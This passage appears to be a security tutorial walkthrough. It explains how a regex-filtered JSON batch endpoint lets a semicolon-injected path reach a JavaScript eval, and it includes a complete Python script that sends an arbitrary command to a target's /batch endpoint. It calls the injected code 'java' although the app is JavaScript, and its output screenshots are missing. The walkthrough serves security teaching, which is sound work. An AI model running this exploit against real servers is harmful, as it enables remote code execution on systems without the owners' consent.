## Understanding The Regex
Before we start to exploit the vulnerability of the eval function, we need to first understand what kind of sanitization/formatting is being done to the JSON request through the regular expression.
The regex we're dealing with looks like so:

```javascript
var requestRegex = /(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g;
```

To understand this regex, we can visit [regex101](https://regex101.com/), which provides easy explanation for any regex.
In our test string field we'll simply insert a value from the example batch.js file from the POST request path, add a terminator, and add an example command

Here:
1. The forward slashes are used as string separators
2. The strings between the slashes are then grouped using the dot character as a separator, but only if the $d pattern is matched
3. The payload ";hacked" is injected into the original statement, and manages to bypass the regex test. This is because the semi-colon(;) character terminates the statement in JavaScript.

This will let us append code to the statement, and let us execute code on the remote server.
To trigger the bug, we'll use the following script:

```python
import requests,sys

if len(sys.argv) != 3:
    print "(+) usage: %s <target> <cmd_injection>" % sys.argv[0]
    sys.exit(-1)
    
target = "http://%s:8080/batch" % sys.argv[1]

cmd = sys.argv[2]

request_1 = '{"method":"get","path":"/profile"}'
request_2 = '{"method":"get","path":"/item"}'
request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % cmd

json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3)

r = requests.post(target, json)

print r.content
```

We execute the script with our arguments, and see nothing special:

However, checking the log file:

We see that we are able to execute arbitrary java code on the server.
All that's left to do is use this bug to get a reverse shell.
